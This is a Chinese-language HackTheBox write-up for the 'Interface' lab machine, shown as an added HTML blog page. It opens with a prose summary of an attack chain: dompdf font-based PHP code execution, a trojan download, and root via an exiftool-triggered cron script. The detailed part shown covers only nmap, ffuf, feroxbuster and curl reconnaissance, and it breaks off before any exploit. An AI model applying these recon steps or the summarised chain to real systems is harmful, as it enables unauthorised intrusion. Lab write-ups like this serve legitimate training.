@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Interface​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;527 首先使用 Nmap 進行掃描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Interface">
+<meta property="og:url" content="https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Interface​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;527 首先使用 Nmap 進行掃描">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015726-g1xktov.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226233209-m62zaq6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226233220-qd1fkxj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226234511-6lywloa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228012342-p19wguq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235429-ataslbf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227001411-5c30awt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227001703-c82eisq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003027-ucun4ia.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003053-4opg46j.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003716-r0vqeg3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003800-ttohhub.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228012943-ytnip08.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235521-v7gq9kb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235711-bznfooe.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235831-a38t2ya.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000329-1ywogsg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000349-ofzzgrf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003904-zha06dr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000737-cfwzjed.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228014703-ix9wj4v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228014511-wkho546.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227004306-vbi1gvv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227004823-h5mnuvj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227005142-jdgxk35.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227005243-cynw3v4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011649-00woaes.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011922-71zp2lm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011935-re4zavm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227012035-t3bh844.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227013052-94i1xbq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227013238-on14dhf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014409-ow21zbc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014933-6o5wb0l.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014842-klzblxq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015117-et2qicu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015350-kfrh8cn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015530-3llw30t.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015622-vni0qp3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015637-leebsoa.png">
+<meta property="article:published_time" content="2024-12-27T22:14:00.000Z">
+<meta property="article:modified_time" content="2024-12-27T22:16:22.996Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015726-g1xktov.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Interface</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/28/2024-htb-machine/57-UpDown/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/28/2024-htb-machine/55-Ransom/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&text=HackTheBox - Machine - Interface"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&is_video=false&description=HackTheBox - Machine - Interface"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Interface&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&name=HackTheBox - Machine - Interface&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&t=HackTheBox - Machine - Interface"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Interface
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-27T22:14:00.000Z" class="dt-published" itemprop="datePublished">2024-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h1><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015726-g1xktov.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/463126/527">https://www.hackthebox.com/achievement/machine/463126/527</a></p>
+<p>首先使用 Nmap 進行掃描，並將域名 interface.htb 加入到 &#x2F;etc&#x2F;hosts，隨後透過瀏覽器訪問，發現得到的內容有限。接著，嘗試掃描子域名和子目錄，但仍未獲得有用信息。在觀察瀏覽器的請求時，意外發現了一個名為 prd.m.rendering-api.interface.htb 的域名，進一步探索後發現了 api 和 vendor 兩個目錄。使用 GET 和 POST 請求對 html2pdf 進行測試，雖然初步測試未見結果，但經過關鍵字掃描後，尋找有效的提交參數。在發現 html2pdf 可能存在 XSS 漏洞後，轉而探索 vendor 目錄，發現 dompdf 框架的存在，並且進一步研究其代碼後得知，當自定義字體的後綴名不正確時，可能會導致 PHP 代碼的執行。為了利用這一漏洞，修改了 exploit.css 和 exploit_font.php，通過 Python 服務器上傳惡意字體，成功下載了木馬。進一步檢查發現系統中有一個 cronjob 在運行，使用 pspy 監控其動作，發現腳本中存在漏洞，可通過 exiftool 來執行任意命令。最終，通過巧妙地操作文件的 Producer 屬性，成功獲得 root 權限。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><p>首先使用 Nmap 進行掃描：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     syn-ack ttl <span class="number">63</span> OpenSSH <span class="number">7.6</span>p1 Ubuntu 4ubuntu0<span class="number">.7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">72</span>:<span class="number">89</span>:a0:<span class="number">95</span>:7e:ce:ae:a8:<span class="number">59</span>:6b:2d:2d:bc:<span class="number">90</span>:b5:5a (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsUhYQQaT6D7Isd510Mjs3HcpUf64NWRgfkCDtCcPC3KjgNKdOByzhdgpqKftmogBoGPHDlfDboK5hTEm/6mqhbNQDhOiX1Y++AXwcgLAOpjfSExhKQSyKZVveZCl/JjB/th0YA12XJXECXl5GbNFtxDW6DnueLP5l0gWzFxJdtj7C57yai6MpHieKm564NOhsAqYqcxX8O54E9xUBW4u9n2vSM6ZnMutQiNSkfanyV0Pdo+yRWBY9TpfYHvt5A3qfcNbF3tMdQ6wddCPi98g+mEBdIbn1wQOvL0POpZ4DVg0asibwRAGo1NiUX3+dJDJbThkO7TeLyROvX/kostPH</span><br><span class="line">|   <span class="number">256</span> 01:<span class="number">84</span>:8c:<span class="number">66</span>:d3:4e:c4:b1:<span class="number">61</span>:1f:2d:4d:<span class="number">38</span>:9c:<span class="number">42</span>:c3 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrQxMOFdtvAa9AGgwirSYniXm7NpzZbgIKhzgCOM1qwqK8QFkN6tZuQsCsRSzZ59+<span class="number">3l</span>+Ycx5lTn11fbqLFqoqM=</span><br><span class="line">|   <span class="number">256</span> cc:<span class="number">62</span>:<span class="number">90</span>:<span class="number">55</span>:<span class="number">60</span>:a6:<span class="number">58</span>:<span class="number">62</span>:9e:6b:<span class="number">80</span>:<span class="number">10</span>:5c:<span class="number">79</span>:9b:<span class="number">55</span> (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPtZ4bP4/4TJNGMNMmXWqt2dLijhttMoaeiJYJRJ4Kqy</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    syn-ack ttl <span class="number">63</span> nginx <span class="number">1.14</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">|_http-title: Site Maintenance</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 21B739D43FCB9BBB83D8541FE4FE88FA</span><br><span class="line">|_http-server-header: nginx/<span class="number">1.14</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>interface.htb</code>​ 加入到 <code>/etc/hosts</code>​ ，然後使用瀏覽器打開，得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226233209-m62zaq6.png" alt="image">​</p>
+<p>既然有了域名，那就嘗試掃描一下子域名，結果什麽也沒有得到。</p>
+<p>那就掃描一下子目錄：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://10.129.228.208&quot;</span>  -H <span class="string">&quot;Host: FUZZ.interface.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226233220-qd1fkxj.png" alt="image">同樣的什麽也沒有得到。</p>
+<p>在觀察瀏覽器的每一個請求的記錄的時候：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226234511-6lywloa.png" alt="image">​</p>
+<p>發現頭文件居然有另一個域名： <code>prd.m.rendering-api.interface.htb</code>​，打開後得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228012342-p19wguq.png" alt="image">​</p>
+<p>所以嘗試掃一下目錄：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -d <span class="number">2</span> </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235429-ataslbf.png" alt="image">​</p>
+<p>得到了一個 <code>api</code>​ 和 <code>vendor</code>​ 這兩個目錄。</p>
+<h2 id="Fuzzing-api"><a href="#Fuzzing-api" class="headerlink" title="Fuzzing api"></a>Fuzzing api</h2><p>所以嘗試掃描該目錄，使用 GET 請求：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/api/&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -C <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227001411-5c30awt.png" alt="image">​</p>
+<p>結果什麽也沒有，如果換成 POST 請求試試看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -m POST -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/api/&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -C <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227001703-c82eisq.png" alt="image">​</p>
+<p>得到了一個 <code>html2pdf</code>​。</p>
+<h2 id="Play-with-html2pdf"><a href="#Play-with-html2pdf" class="headerlink" title="Play with html2pdf"></a>Play with html2pdf</h2><p>既然有了<code>html2pdf</code>​，由於是 POST 請求，肯定是要提交一些東西上去，問題是如何知道提交的關鍵字呢？</p>
+<p>只能使用 <code>ffuf</code>​ 進行關鍵字掃描，首先從 url 傳遞參數開始：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -X POST -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/api/html2pdf?FUZZ=mane&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -fr <span class="string">&quot;missing parameters&quot;</span> -mc <span class="built_in">all</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003027-ucun4ia.png" alt="image">​</p>
+<p>結果什麽也沒有，然後掃描 <code>json</code>​ 傳遞的關鍵字，在 <code>ffuf -h</code>​ 中也有提示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -h</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003053-4opg46j.png" alt="image">​</p>
+<p>所以命令如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -X POST -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/api/html2pdf&quot;</span>  -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;FUZZ&quot;:&quot;manesec&quot;&#125;&#x27;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -fr <span class="string">&quot;missing parameters&quot;</span> -mc <span class="built_in">all</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003716-r0vqeg3.png" alt="image">​</p>
+<p>得到 <code>html</code>​ 的關鍵字，隨便提交一些數據看看會發生什麽：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v -X POST <span class="string">&#x27;http://prd.m.rendering-api.interface.htb/api/html2pdf&#x27;</span> -d <span class="string">&#x27;&#123;&quot;html&quot;:&quot;mane&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003800-ttohhub.png" alt="image">​</p>
+<p>結果提交後什麽也沒有得到。</p>
+<p>然後搜索了一番，看到最近的 <code>html2pdf</code>​ 是 xss 的漏洞，感覺不會用到該機器上，所以嘗試尋找其他思路：</p>
